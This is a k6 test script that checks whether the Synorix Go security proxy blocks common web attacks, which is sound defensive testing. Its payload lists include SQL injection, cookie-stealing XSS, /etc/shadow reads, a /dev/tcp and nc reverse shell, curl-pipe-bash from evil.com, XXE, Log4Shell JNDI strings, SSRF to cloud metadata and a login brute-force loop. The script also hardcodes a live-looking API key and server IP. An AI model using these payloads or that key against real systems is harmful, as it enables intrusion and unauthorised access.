/**
 * Synorix WAF Attack Simulation — WAF-only test
 * Validates that the Go security proxy blocks all major attack categories.
 *
 * Usage:
 *   k6 run perf/k6_waf_test.js
 *
 * Override if needed:
 *   k6 run -e PROXY_URL=http://165.232.166.48:8080/user-proxy \
 *          -e API_KEY=<your_key> \
 *          perf/k6_waf_test.js
 */

import http from 'k6/http';
import { check, sleep, group } from 'k6';
import { Counter, Rate, Trend } from 'k6/metrics';

// ─── Config ───────────────────────────────────────────────────────────────────
const PROXY_URL = (__ENV.PROXY_URL || 'http://165.232.166.48:8080/user-proxy').replace(/\/$/, '');
const API_KEY   = __ENV.API_KEY    || 'nxr_8e57a3aff816e06ff1105d1135abfdc7098fae7c96574afebb3fb45e507fb14b';

// ─── Custom Metrics ───────────────────────────────────────────────────────────
const wafBlocked       = new Counter('waf_blocked');
const wafAllowed       = new Counter('waf_allowed');
const wafBlockRate     = new Rate('waf_block_rate');
const attackResponseMs = new Trend('attack_response_ms');

// Per-category block counters
const catSQLi     = new Rate('cat_sqli_blocked');
const catXSS      = new Rate('cat_xss_blocked');
const catLFI      = new Rate('cat_lfi_blocked');
const catRCE      = new Rate('cat_rce_blocked');
const catXXE      = new Rate('cat_xxe_blocked');
const catSSRF     = new Rate('cat_ssrf_blocked');
const catLog4j    = new Rate('cat_log4shell_blocked');
const catWebshell = new Rate('cat_webshell_blocked');
const catSSTI     = new Rate('cat_ssti_blocked');
const catNoSQLi   = new Rate('cat_nosqli_blocked');
const catScanner  = new Rate('cat_scanner_blocked');

// ─── Test Options ─────────────────────────────────────────────────────────────
export const options = {
  scenarios: {
    waf_attacks: {
      executor: 'ramping-vus',
      startVUs: 1,
      stages: [
        { duration: '30s', target: 5  },
        { duration: '1m',  target: 10 },
        { duration: '20s', target: 0  },
      ],
      gracefulRampDown: '10s',
    },
  },
  thresholds: {
    'http_req_failed':    ['rate<0.99'],   // we expect many 403s — not real failures
    'waf_block_rate':     ['rate>0.90'],   // ≥90% of attack requests must be blocked
    'attack_response_ms': ['p(95)<3000'],
    // Per-category thresholds
    'cat_sqli_blocked':      ['rate>0.90'],
    'cat_xss_blocked':       ['rate>0.90'],
    'cat_lfi_blocked':       ['rate>0.90'],
    'cat_rce_blocked':       ['rate>0.90'],
    'cat_xxe_blocked':       ['rate>0.90'],
    'cat_ssrf_blocked':      ['rate>0.90'],
    'cat_log4shell_blocked': ['rate>0.90'],
    'cat_webshell_blocked':  ['rate>0.90'],
    'cat_ssti_blocked':      ['rate>0.90'],
    'cat_nosqli_blocked':    ['rate>0.90'],
    'cat_scanner_blocked':   ['rate>0.90'],
  },
  summaryTrendStats: ['avg', 'min', 'med', 'p(90)', 'p(95)', 'p(99)', 'max'],
};

// ─── Attack Payloads ──────────────────────────────────────────────────────────
const PAYLOADS = {
  sqli: [
    "' UNION SELECT username,password FROM users--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1; DROP TABLE users--",
    "1' AND SLEEP(5)--",
    "'; EXEC xp_cmdshell('whoami')--",
    "' OR 1=1--",
    "1 AND 1=1 UNION SELECT * FROM information_schema.tables--",
    "' OR EXISTS(SELECT * FROM information_schema.tables)--",
    "1; INSERT INTO users(username,password) VALUES('hax','hax')--",
    "' AND BENCHMARK(5000000,MD5(1))--",
  ],
  xss: [
    '<script>alert(document.cookie)</script>',
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<img src=x onerror=alert(document.domain)>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=document.write(document.cookie)>',
    "javascript:eval('alert(1)')",
    '<iframe src=javascript:alert(1)></iframe>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '"><script>window.location="http://evil.com?c="+document.cookie</script>',
  ],
  lfi: [
    '../../../../etc/passwd',
    '../../etc/shadow',
    '/proc/self/environ',
    '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '/var/log/auth.log',
    '/var/log/apache2/access.log',
    'php://filter/convert.base64-encode/resource=/etc/passwd',
    'php://input',
    'expect://id',
    'phar://shell.phar',
    'zip:///etc/passwd',
    'data://text/plain;base64,SSBoYXgK',
  ],
  rce: [
    '; cat /etc/passwd',
    '; whoami',
    '|| id',
    '&& ls -la /',
    '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    '/bin/sh -c id',
    'cmd.exe /c whoami',
    'powershell -c whoami',
    'wget http://evil.com/shell.sh -O /tmp/shell.sh',
    'curl http://evil.com/shell | bash',
    'nc -e /bin/bash 10.0.0.1 4444',
  ],
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC "foo" "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>',
  ],
  ssrf: [
    'http://localhost/admin',
    'http://127.0.0.1:3001/api/admin',
    'http://169.254.169.254/latest/meta-data/',
    'http://0.0.0.0:22/',
    'http://192.168.1.1/admin',
    'http://[::1]:80/',
  ],
  log4shell: [
    '${jndi:ldap://evil.com/a}',
    '${jndi:rmi://evil.com/a}',
    '${jndi:dns://evil.com/a}',
    '${${lower:j}ndi:${lower:ldap}://evil.com/a}',
    '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}',
  ],
  webshell: [
    'shell.php',
    'webshell.php5',
    'c99.php',
    'r57.php',
    'wso.php',
    'b374k.php',
    '.htaccess',
    'web.config',
    'upload.php.jpg',
    'cmd.asp',
    'shell.jsp',
    'evil.exe',
    'eval(base64_decode(base64encodedshell))',
  ],
  nosql: [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$lt": "zzzzz"}',
    '{"$regex": ".*"}',
    '{"$where": "this.password.length > 0"}',
    '{"$nin": []}',
  ],
  ssti: [
    '{{7*7}}',
    '{{config}}',
    '{{__class__.__mro__}}',
    '${7*7}',
    '#{7*7}',
    '<%= 7*7 %>',
    '{{request.__class__.__mro__[9].__subclasses__()}}',
  ],
  scannerUA: [
    'sqlmap/1.7.8#stable (https://sqlmap.org)',
    'Nikto/2.1.6 (https://cirt.net/nikto2)',
    'Acunetix/14.0',
    'Nessus/10.4.1',
    'BurpSuitePro/2023.1',
    'ZAP/2.12.0 (OWASP ZAP)',
    'w3af/1.7.6',
    'Mozilla/5.0 (compatible; Googlebot-selenium/2.1)',
    'HeadlessChrome/108.0.5359.94',
    'python-requests/2.28.0',
  ],
};

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function headers(ua) {
  return {
    'X-API-Key':    API_KEY,
    'Accept':       'application/json',
    'Content-Type': 'application/json',
    'User-Agent':   ua || 'k6-synorix-waf-test/1.0',
  };
}

function logResult(label, res, catMetric) {
  const blocked = res.status === 403 || res.status === 406 || res.status === 429;
  const rule    = res.headers['X-WAF-Rule'] || res.headers['x-waf-rule'] || 'N/A';

  attackResponseMs.add(res.timings.duration);
  wafBlocked.add(blocked ? 1 : 0);
  wafAllowed.add(blocked ? 0 : 1);
  wafBlockRate.add(blocked ? 1 : 0);
  if (catMetric) catMetric.add(blocked ? 1 : 0);

  if (blocked) {
    console.log(`[BLOCKED ✗] ${label} | HTTP ${res.status} | rule=${rule}`);
  } else {
    console.log(`[ALLOWED ✓] ${label} | HTTP ${res.status}`);
  }
  return blocked;
}

// ─── Attack Functions ─────────────────────────────────────────────────────────

function testSQLInjection() {
  group('SQL Injection', () => {
    const payload = pick(PAYLOADS.sqli);
    const r1 = http.get(
      `${PROXY_URL}/api/users?search=${encodeURIComponent(payload)}`,
      { headers: headers(), tags: { attack: 'sqli_get' } }
    );
    check(r1, { 'SQLi GET blocked': (r) => r.status === 403 });
    logResult(`SQLi GET: ${payload}`, r1, catSQLi);

    const r2 = http.post(
      `${PROXY_URL}/api/auth/login`,
      JSON.stringify({ username: payload, password: 'anything' }),
      { headers: headers(), tags: { attack: 'sqli_post' } }
    );
    check(r2, { 'SQLi POST blocked': (r) => r.status === 403 });
    logResult(`SQLi POST: ${payload}`, r2, catSQLi);
  });
}

function testNoSQLInjection() {
  group('NoSQL Injection', () => {
    const payload = pick(PAYLOADS.nosql);
    const r = http.post(
      `${PROXY_URL}/api/auth/login`,
      JSON.stringify({ username: { $ne: null }, password: payload }),
      { headers: headers(), tags: { attack: 'nosql' } }
    );
    check(r, { 'NoSQLi blocked': (r) => r.status === 403 });
    logResult(`NoSQLi: ${payload}`, r, catNoSQLi);
  });
}

function testXSS() {
  group('Cross-Site Scripting (XSS)', () => {
    const payload = pick(PAYLOADS.xss);
    const r = http.post(
      `${PROXY_URL}/api/products`,
      JSON.stringify({ name: payload, description: 'test' }),
      { headers: headers(), tags: { attack: 'xss' } }
    );
    check(r, { 'XSS blocked': (r) => r.status === 403 });
    logResult(`XSS: ${payload}`, r, catXSS);
  });
}

function testLFI() {
  group('Local File Inclusion (LFI)', () => {
    const payload = pick(PAYLOADS.lfi);
    const r = http.get(
      `${PROXY_URL}/api/files?path=${encodeURIComponent(payload)}`,
      { headers: headers(), tags: { attack: 'lfi' } }
    );
    check(r, { 'LFI blocked': (r) => r.status === 403 });
    logResult(`LFI: ${payload}`, r, catLFI);
  });
}

function testRCE() {
  group('Remote Code Execution (RCE)', () => {
    const payload = pick(PAYLOADS.rce);
    const r = http.post(
      `${PROXY_URL}/api/run`,
      JSON.stringify({ cmd: payload }),
      { headers: headers(), tags: { attack: 'rce' } }
    );
    check(r, { 'RCE blocked': (r) => r.status === 403 || r.status === 404 });
    logResult(`RCE: ${payload}`, r, catRCE);
  });
}

function testXXE() {
  group('XML External Entity (XXE)', () => {
    const payload = pick(PAYLOADS.xxe);
    const xmlHdrs = Object.assign({}, headers(), { 'Content-Type': 'application/xml' });
    const r = http.post(
      `${PROXY_URL}/api/data`,
      payload,
      { headers: xmlHdrs, tags: { attack: 'xxe' } }
    );
    check(r, { 'XXE blocked': (r) => r.status === 403 });
    logResult(`XXE: ${payload.substring(0, 60)}`, r, catXXE);
  });
}

function testSSRF() {
  group('Server-Side Request Forgery (SSRF)', () => {
    const payload = pick(PAYLOADS.ssrf);
    const r = http.post(
      `${PROXY_URL}/api/fetch`,
      JSON.stringify({ url: payload }),
      { headers: headers(), tags: { attack: 'ssrf' } }
    );
    check(r, { 'SSRF blocked': (r) => r.status === 403 });
    logResult(`SSRF: ${payload}`, r, catSSRF);
  });
}

function testLog4Shell() {
  group('Log4Shell / JNDI Injection', () => {
    const payload = pick(PAYLOADS.log4shell);
    const hdrs = Object.assign({}, headers(), {
      'User-Agent':      payload,
      'X-Forwarded-For': payload,
      'X-Api-Version':   payload,
    });
    const r = http.get(
      `${PROXY_URL}/api/version`,
      { headers: hdrs, tags: { attack: 'log4shell' } }
    );
    check(r, { 'Log4Shell blocked': (r) => r.status === 403 });
    logResult(`Log4Shell: ${payload}`, r, catLog4j);
  });
}

function testWebshell() {
  group('Webshell / Malicious Upload', () => {
    const fname = pick(PAYLOADS.webshell);
    const r = http.post(
      `${PROXY_URL}/api/upload`,
      JSON.stringify({ filename: fname, content: 'eval(base64_decode("cGhwaW5mbygpOw=="))' }),
      { headers: headers(), tags: { attack: 'webshell' } }
    );
    check(r, { 'Webshell blocked': (r) => r.status === 403 });
    logResult(`Webshell: ${fname}`, r, catWebshell);
  });
}

function testSSTI() {
  group('Server-Side Template Injection (SSTI)', () => {
    const payload = pick(PAYLOADS.ssti);
    const r = http.post(
      `${PROXY_URL}/api/render`,
      JSON.stringify({ template: payload }),
      { headers: headers(), tags: { attack: 'ssti' } }
    );
    check(r, { 'SSTI blocked': (r) => r.status === 403 });
    logResult(`SSTI: ${payload}`, r, catSSTI);
  });
}

function testPathTraversal() {
  group('Path Traversal', () => {
    const payload = pick(PAYLOADS.lfi);
    const r = http.get(
      `${PROXY_URL}/api/static${encodeURIComponent(payload)}`,
      { headers: headers(), tags: { attack: 'path_traversal' } }
    );
    check(r, { 'Path traversal blocked': (r) => r.status === 403 || r.status === 404 });
    logResult(`Path traversal: ${payload}`, r, catLFI);
  });
}

function testScannerUserAgent() {
  group('Scanner User-Agents', () => {
    const ua = pick(PAYLOADS.scannerUA);
    const paths = ['/', '/admin', '/api/admin/', '/phpmyadmin', '/wp-admin', '/.env', '/.git/config', '/swagger'];
    paths.forEach((path) => {
      const r = http.get(
        `${PROXY_URL}${path}`,
        { headers: headers(ua), tags: { attack: 'scanner_ua' } }
      );
      logResult(`Scanner UA [${ua.split('/')[0]}] ${path}`, r, catScanner);
    });
  });
}

function testBruteForce() {
  group('Brute Force Login', () => {
    for (let i = 0; i < 10; i++) {
      const r = http.post(
        `${PROXY_URL}/api/auth/login`,
        JSON.stringify({ username: 'admin', password: `wrongpass${i}` }),
        { headers: headers(), tags: { attack: 'brute_force' } }
      );
      logResult(`Brute force attempt #${i + 1}`, r);
      if (r.status === 429) {
        console.log('  ↳ [RATE LIMITED] Brute force detected!');
        break;
      }
    }
  });
}

// ─── Main ─────────────────────────────────────────────────────────────────────
export default function () {
  const rand = Math.random();

  if      (rand < 0.14) testSQLInjection();
  else if (rand < 0.22) testNoSQLInjection();
  else if (rand < 0.32) testXSS();
  else if (rand < 0.42) testLFI();
  else if (rand < 0.51) testRCE();
  else if (rand < 0.59) testXXE();
  else if (rand < 0.67) testSSRF();
  else if (rand < 0.74) testLog4Shell();
  else if (rand < 0.81) testWebshell();
  else if (rand < 0.87) testSSTI();
  else if (rand < 0.93) testScannerUserAgent();
  else if (rand < 0.97) testPathTraversal();
  else                  testBruteForce();

  sleep(0.3);
}

// ─── Setup ────────────────────────────────────────────────────────────────────
export function setup() {
  console.log('='.repeat(60));
  console.log('  Synorix WAF Attack Simulation');
  console.log(`  Target : ${PROXY_URL}`);
  console.log(`  API Key: ${API_KEY.substring(0, 12)}...`);
  console.log('='.repeat(60));

  const health = http.get('http://165.232.166.48:8080/health', { headers: headers() });
  if (health.status === 200) {
    console.log('  [OK] Proxy reachable');
  } else {
    console.warn(`  [WARN] Proxy health check returned HTTP ${health.status} — continuing anyway`);
  }
  console.log('='.repeat(60));
}

// ─── Summary ──────────────────────────────────────────────────────────────────
export function handleSummary(data) {
  const m        = data.metrics;
  const blocked  = m.waf_blocked ? m.waf_blocked.values.count : 0;
  const allowed  = m.waf_allowed ? m.waf_allowed.values.count : 0;
  const total    = blocked + allowed;
  const blockPct = total > 0 ? ((blocked / total) * 100).toFixed(1) : '0.0';

  function catPct(key) {
    const metric = m[key];
    if (!metric) return 'N/A';
    return (metric.values.rate * 100).toFixed(1) + '%';
  }

  const summary = `
${'='.repeat(60)}
  SYNORIX WAF — ATTACK SIMULATION RESULTS
${'='.repeat(60)}
  Total attack requests : ${total}
  WAF Blocked           : ${blocked}  (${blockPct}% block rate)
  WAF Allowed           : ${allowed}
${'='.repeat(60)}
  Per-category block rates:
    SQLi               : ${catPct('cat_sqli_blocked')}
    NoSQLi             : ${catPct('cat_nosqli_blocked')}
    XSS                : ${catPct('cat_xss_blocked')}
    LFI / Path trav.   : ${catPct('cat_lfi_blocked')}
    RCE                : ${catPct('cat_rce_blocked')}
    XXE                : ${catPct('cat_xxe_blocked')}
    SSRF               : ${catPct('cat_ssrf_blocked')}
    Log4Shell          : ${catPct('cat_log4shell_blocked')}
    Webshell           : ${catPct('cat_webshell_blocked')}
    SSTI               : ${catPct('cat_ssti_blocked')}
    Scanner UAs        : ${catPct('cat_scanner_blocked')}
${'='.repeat(60)}
  TIP: Check https://synorix-pied-chi.vercel.app/user/alerts
       for live WAF alerts in the dashboard.
${'='.repeat(60)}
`;
  console.log(summary);
  return { stdout: summary };
}
